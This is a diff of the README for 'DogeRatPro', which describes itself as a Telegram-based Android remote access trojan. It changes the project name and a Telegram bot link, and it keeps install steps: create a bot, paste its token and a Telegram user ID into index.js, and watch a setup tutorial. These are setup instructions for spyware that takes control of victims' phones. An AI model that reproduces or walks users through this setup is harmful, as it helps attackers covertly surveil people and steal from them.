@@ -1,4 +1,4 @@
-# DogiRatPro
+# DogeRatPro
 A telegram based android RAT
 
 # Install Steps
@@ -10,6 +10,6 @@ A telegram based android RAT
 - Then send your bot name. For example : SH-Hacked_Bot 
 - Send your bot username. For example sh_hacked_bot
 - Copy the botToken and paste it on index.js token value
-- The search <a href="https://t.me/cybersh_bott">@CyberSH All Ine One</a> then type ````/id````
+- The search <a href="https://t.me/cybersh_bot">@cybersh_bot</a> then type ````/id````
 - Copy your id and edit the index.js id value.
 - RAT setup full tutorial : <a href="">Watch Now</a>
